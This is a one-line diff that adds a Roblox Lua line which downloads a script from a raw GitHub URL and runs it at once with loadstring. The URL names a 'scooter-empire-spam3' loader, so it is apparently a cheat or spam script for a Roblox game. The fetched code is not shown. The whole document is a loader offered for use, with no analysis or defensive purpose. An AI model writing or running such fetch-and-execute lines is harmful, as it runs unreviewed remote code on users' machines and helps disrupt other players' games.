@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/scooter-empire-spam3-dtb78cyrm6ixum.lua"))()
